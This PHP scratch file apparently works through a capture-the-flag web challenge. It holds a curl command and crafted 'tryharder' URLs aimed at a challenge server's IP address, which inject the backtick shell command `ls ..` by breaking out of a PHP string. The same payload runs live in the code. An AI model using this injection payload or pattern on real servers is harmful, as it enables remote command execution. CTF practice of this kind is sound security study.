<?=
// curl -vvv 'http://35.198.103.37:31239/' --data 'password=alabalaportocala'
/* http://35.198.103.37:31239/secrets/1f10938c832aec1d23d8bc5e6342415b/index.php?tryharder=/'?><?=`ls+..`; */
// http://35.198.103.37:31239/secrets/1f10938c832aec1d23d8bc5e6342415b/index.php?tryharder=%2F'%3F%3E%3C%3F%3D%60ls%20..%60%3B
define('WORKING_DIRECTORY', getcwd());


$var = <<<xd
0
xd;

// echo $var;


$contents = '<?=
define(\'WORKING_DIRECTORY\', getcwd());

$var = <<<xd
0
xd;

echo $var;';
$search_pattern = '/\$var = <<<xd/'?><?=`ls ..`;
preg_match($search_pattern, $contents, $matches);
print_r($matches);

function test() {
  chdir(WORKING_DIRECTORY);
  if (empty($_GET['tryharder'])) {
      $_GET['tryharder'] = 0;
      show_source(__FILE__);
  }
  if (strlen($_GET['tryharder']) > 15){
      $_GET['tryharder'] = 0;
  }
  $contents = file_get_contents(__FILE__);
  $search_pattern = '/\$var = <<<xd/'?><?=`ls ..`;
  preg_match($search_pattern, $contents, $matches);
  
  // $new_contents = preg_replace_callback($search_pattern, function($matches) {
  //     return str_replace($matches[1], $_GET['tryharder'], $matches[0]);
  // }, $contents);
  // file_put_contents(__FILE__, $new_contents, LOCK_EX);
}
$_GET['tryharder'] = 'wtf';
test();